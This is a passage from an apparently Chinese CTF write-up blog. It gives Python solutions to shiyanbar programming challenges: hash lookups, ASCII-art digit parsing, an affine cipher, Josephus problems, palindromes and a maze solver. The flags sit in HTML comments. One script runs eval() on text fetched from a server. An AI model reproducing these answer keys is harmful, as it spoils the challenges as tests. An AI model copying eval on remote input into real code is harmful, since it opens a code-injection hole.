print(str)</span></span><br><span class="line">    num = list[str]</span><br><span class="line">    params = &#123;<span class="string">'inputNumber'</span>:num&#125;</span><br><span class="line">    <span class="comment"># print(params)</span></span><br><span class="line">    params = parse.urlencode(params).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    response = request.urlopen(req, params)</span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>for resquests：↓<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5,sha1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成字典</span></span><br><span class="line">list = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100001</span>):</span><br><span class="line">    Sha1 = sha1((md5(str(i).encode(<span class="string">'utf-8'</span>)).hexdigest()).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    list[Sha1] = i</span><br><span class="line"><span class="comment"># print(list)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/ppc/sd.php'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    req = s.get(url)</span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="comment"># print(req.text)</span></span><br><span class="line">    Str = re.findall(<span class="string">r'&gt;(.*)&lt;/div&gt;'</span>,req.text)</span><br><span class="line">    response = s.post(url,data=&#123;<span class="string">'inputNumber'</span>:list[Str[<span class="number">0</span>]]&#125;)</span><br><span class="line">    response.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    print(response.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><!--CTF{BlAsT_FasT_Pr0gRamE}--><h1 id="ASCII艺术"><a href="#ASCII艺术" class="headerlink" title="ASCII艺术"></a>ASCII艺术</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">'http://ctf5.shiyanbar.com/ppc/acsii.php'</span></span><br><span class="line">    req = request.Request(url)</span><br><span class="line">    req.add_header(<span class="string">"Cookie"</span>,<span class="string">"PHPSESSID=ga0un6plm7tea9li11bgnommh1"</span>)</span><br><span class="line">    <span class="comment"># print(req)</span></span><br><span class="line">    response = request.urlopen(req)</span><br><span class="line">    html = response.read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    a = <span class="string">r':red"&gt;(.*?)&lt;/div&gt;'</span></span><br><span class="line">    content = re.findall(a,html)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line">    num = str(content)</span><br><span class="line">    <span class="comment"># print(num)</span></span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;'</span>,<span class="string">'0'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;xx&lt;br /&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br /&gt;xxxxx&lt;br /&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;xx&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;xxxxx&lt;br&gt;&lt;br/&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;xx&amp;nbsp;&lt;br /&gt;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;xxxxx&lt;br /&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;&amp;nbsp;xx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;'</span>,<span class="string">'8'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'xxxxx&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;xxxx&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;xxxxx&lt;br /&gt;'</span>, <span class="string">'5'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxxxx&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'xxxxx&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;xxxx&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;xxxxx&lt;br /&gt;'</span>, <span class="string">'5'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&lt;br/&gt;'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(num)</span></span><br><span class="line">    params = &#123;<span class="string">'inputNumber'</span>:num&#125;</span><br><span class="line">    <span class="comment"># print(params)</span></span><br><span class="line">    params = parse.urlencode(params).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    response = request.urlopen(req, params)</span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 简化输出</span></span><br><span class="line">    <span class="comment"># response = response.read().decode('utf-8')</span></span><br><span class="line">    <span class="comment"># # print(response)</span></span><br><span class="line">    <span class="comment"># key = r"&lt;div id='msg'&gt;(.*?)&lt;/div&gt;"</span></span><br><span class="line">    <span class="comment"># flag = re.findall(key,response)[0]</span></span><br><span class="line">    <span class="comment"># print(flag)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>for requests：↓<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re,requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/ppc/acsii.php'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    req = s.get(url)</span><br><span class="line">    req.encoding=<span class="string">'utf-8'</span></span><br><span class="line">    <span class="comment"># print(req.text)</span></span><br><span class="line">    a = <span class="string">r':red"&gt;(.*?)&lt;/div&gt;'</span></span><br><span class="line">    content = re.findall(a,req.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line">    num = str(content)</span><br><span class="line">    <span class="comment"># print(num)</span></span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;'</span>,<span class="string">'0'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;xx&lt;br /&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br /&gt;xxxxx&lt;br /&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;xx&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;xxxxx&lt;br&gt;&lt;br/&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;xx&amp;nbsp;&lt;br /&gt;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;xxxxx&lt;br /&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;&amp;nbsp;xx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;'</span>,<span class="string">'8'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'xxxxx&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;xxxx&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;xxxxx&lt;br /&gt;'</span>, <span class="string">'5'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&amp;nbsp;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxxxx&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'xxxxx&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;xxxx&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;xxxxx&lt;br /&gt;'</span>, <span class="string">'5'</span>)</span><br><span class="line">    num = num.replace(<span class="string">'&lt;br/&gt;'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="comment"># print(num)</span></span><br><span class="line">    response = s.post(url,data=&#123;<span class="string">'inputNumber'</span>:num&#125;)</span><br><span class="line">    response.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    flag = re.findall(<span class="string">r'id=\'msg\'&gt;(.*)&lt;/div&gt;'</span>,response.text)</span><br><span class="line">    print(flag[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><!--CTF{AsCIi_ArT_pAtTerN_ReC0g}--><h1 id="百米"><a href="#百米" class="headerlink" title="百米"></a>百米</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re,requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/jia/index.php'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    req = s.get(url)</span><br><span class="line">    req.encoding=<span class="string">'gb2312'</span></span><br><span class="line">    <span class="comment"># print(req.text)</span></span><br><span class="line">    math = re.findall(<span class="string">r'my_expr\'&gt;(.*)&lt;/div&gt;'</span>,req.text)</span><br><span class="line">    <span class="comment"># print(math[0])</span></span><br><span class="line">    math = math[<span class="number">0</span>].replace(<span class="string">'x'</span>,<span class="string">'*'</span>)</span><br><span class="line">    <span class="comment"># print(math)</span></span><br><span class="line">    math = eval(math)</span><br><span class="line">    <span class="comment"># print(math)</span></span><br><span class="line">    response = s.post(url,data=&#123;<span class="string">'pass_key'</span>:math&#125;)</span><br><span class="line">    response.encoding=<span class="string">'gb2312'</span></span><br><span class="line">    print(response.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><!--KEY:S33h4Yu--><h1 id="求解！"><a href="#求解！" class="headerlink" title="求解！"></a>求解！</h1><p>密文xztiofwhf是用仿射函数y=5x+11加密得到的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">list = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">newlist = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">    newlist += list[(<span class="number">5</span> * i + <span class="number">11</span> ) % <span class="number">26</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y = <span class="string">'xztiofwhf'</span></span><br><span class="line">x = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> y:</span><br><span class="line">    x += list[newlist.find(j)] <span class="comment">#查找新列表字符对应的位置，在旧列表同样的位置即为flag</span></span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure></p><!--simplexue--><h1 id="海量约瑟夫问题"><a href="#海量约瑟夫问题" class="headerlink" title="海量约瑟夫问题"></a>海量约瑟夫问题</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">57109519409189850198608692898492839208109598203852985209815058928520938958906207207017014242749827958752975981705872782758927827398578971498749287481591758917982491</span></span><br><span class="line">kill1 = <span class="keyword">False</span></span><br><span class="line">start = <span class="number">1</span></span><br><span class="line">sep = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> n != <span class="number">2</span>:</span><br><span class="line">    killn = n / <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> n%<span class="number">2</span> == <span class="number">1</span> <span class="keyword">and</span> kill1:</span><br><span class="line">        killn = killn + <span class="number">1</span> <span class="comment">#杀第一人且n为奇则杀n/2+1人</span></span><br><span class="line">    <span class="keyword">if</span> kill1:</span><br><span class="line">        start = start + sep</span><br><span class="line">    sep = sep * <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> n%<span class="number">2</span> == <span class="number">1</span>: <span class="comment">#n为奇则改变杀开头的第一人还是第二人</span></span><br><span class="line">        kill1 = <span class="keyword">not</span> kill1</span><br><span class="line">    n = n - killn</span><br><span class="line"></span><br><span class="line">print(start+sep)%<span class="number">129119417519</span></span><br></pre></td></tr></table></figure><!--CTF{36821714107}--><h1 id="算术题"><a href="#算术题" class="headerlink" title="算术题"></a>算术题</h1><p>一道小学算术题，但是好多老师不会，不知道为什么<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/PPC/15-01.png" alt="" title="" class="">                <p></p>            </figure><br>从外圈最小的开始顺时针旋转：6531031914842725<br><!--IL0V3Pr0Gr4ming_###)--></p><h1 id="能看到吗"><a href="#能看到吗" class="headerlink" title="能看到吗"></a>能看到吗</h1><p>writeup：<a href="http://hebin.me/2017/09/10/%E8%A5%BF%E6%99%AEctf-%E8%83%BD%E7%9C%8B%E5%88%B0%E5%90%97/" target="_blank" rel="noopener">西普CTF-能看到吗</a><br><!--250686552492--></p><h1 id="双基回文数"><a href="#双基回文数" class="headerlink" title="双基回文数"></a>双基回文数</h1><p>计算大于正整数1600000的最小双基回文数<br>别人的python2脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">sum=<span class="number">1600000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(value,hex_number)</span>:</span>  <span class="comment">#将数转换成不同进制的字符串</span></span><br><span class="line">   sss=<span class="string">''</span></span><br><span class="line">   <span class="keyword">while</span>(value!=<span class="number">0</span>):</span><br><span class="line">      sss+=str(value%hex_number)</span><br><span class="line">      value=((value-value%hex_number)/hex_number)</span><br><span class="line">   <span class="keyword">return</span> sss[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ok</span><span class="params">(aaa)</span>:</span>      <span class="comment">#判断字符串是否为回文数</span></span><br><span class="line">   length=len(aaa)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length/<span class="number">2</span>):</span><br><span class="line">      <span class="keyword">if</span> aaa[i]!=aaa[length<span class="number">-1</span>-i]:</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">   times=<span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">      <span class="keyword">if</span>(ok(handle(sum,i))):  <span class="comment">#统计次数</span></span><br><span class="line">         times+=<span class="number">1</span></span><br><span class="line">   <span class="keyword">if</span> times&gt;<span class="number">1</span>:</span><br><span class="line">      <span class="keyword">print</span> sum</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">   sum+=<span class="number">1</span></span><br></pre></td></tr></table></figure></p><!--CTF{1632995}--><h1 id="约瑟夫环"><a href="#约瑟夫环" class="headerlink" title="约瑟夫环"></a>约瑟夫环</h1><p>总共有2 * k个人报数，前面k个是好人，后面k个是坏人，从第一个好人开始报数，报道m的人要死去。然后从死人的下一个活人继续从头开始报数，报道m的人死去，以此类推。当k = 12时，问m为何值时，坏人全部死去之前不会有好人死去。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">约瑟夫循环，我这里利用python的列表进行<span class="keyword">del</span>删除，设第m个数死，则去掉的位置为</span><br><span class="line">（当前位置m<span class="number">-1</span>）%当前长度</span><br><span class="line">约瑟夫循环没问题之后就是暴力了，分享我的代码~</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">2000000</span>):</span><br><span class="line">    sss=[<span class="number">1</span>]*<span class="number">12</span>+[<span class="number">0</span>]*<span class="number">12</span></span><br><span class="line">    k=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">12</span>):  <span class="comment">#看12杀人之后的结果</span></span><br><span class="line">        k=(k+i<span class="number">-1</span>)%(<span class="number">24</span>-j)</span><br><span class="line">        <span class="keyword">del</span>(sss[k])</span><br><span class="line">    <span class="keyword">if</span> [<span class="number">1</span>]*<span class="number">12</span>==sss:</span><br><span class="line">            print(i)</span><br></pre></td></tr></table></figure></p><!--CTF{1358657}--><h1 id="迷宫大逃亡"><a href="#迷宫大逃亡" class="headerlink" title="迷宫大逃亡"></a>迷宫大逃亡</h1><p>参考：<a href="https://blog.csdn.net/qq_40476955/article/details/79058122" target="_blank" rel="noopener">BFS算法（迷宫大逃亡writeup）</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openfile</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    f = open(<span class="string">"ini.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">    i=int(f.readline().strip())</span><br><span class="line">    <span class="keyword">while</span> (i != <span class="number">0</span>):</span><br><span class="line">        line=<span class="keyword">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> line:</span><br><span class="line">            line = f.readline().strip()</span><br><span class="line">        scale = int(line)</span><br><span class="line">        start = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> f.readline().strip().split():</span><br><span class="line">            start.append(int(x)<span class="number">-1</span>)</span><br><span class="line">        end = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> f.readline().strip().split():</span><br><span class="line">            end.append(int(x)<span class="number">-1</span>)</span><br><span class="line">        migong = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(scale):</span><br><span class="line">            migong.append(f.readline().strip())</span><br><span class="line">        r=pyqueue(len(migong[<span class="number">0</span>]), start, end, migong)</span><br><span class="line">        result+=str(r.run())</span><br><span class="line">        i = i - <span class="number">1</span></span><br><span class="line">        <span class="comment">#print result</span></span><br><span class="line">    <span class="keyword">print</span> result</span><br><span class="line">    flag=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(result),<span class="number">8</span>):</span><br><span class="line">        c = result[i:i+<span class="number">8</span>]</span><br><span class="line">        flag+=chr(int(c,<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">print</span> base64.b64decode(flag)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pyqueue</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, _len, _start, _end, _migong)</span>:</span></span><br><span class="line">        self.len = _len <span class="comment">#地图尺寸</span></span><br><span class="line">        self.start = _start <span class="comment">#起点</span></span><br><span class="line">        self.end = _end <span class="comment">#终点点 格式 [x,y]</span></span><br><span class="line">        self.migong = _migong <span class="comment">#地图</span></span><br><span class="line">        self.queue = [self.start] <span class="comment">#初始的地方</span></span><br><span class="line">        self.steptrace = [] <span class="comment">#走过的地方</span></span><br><span class="line">        self.sucess = <span class="number">0</span>   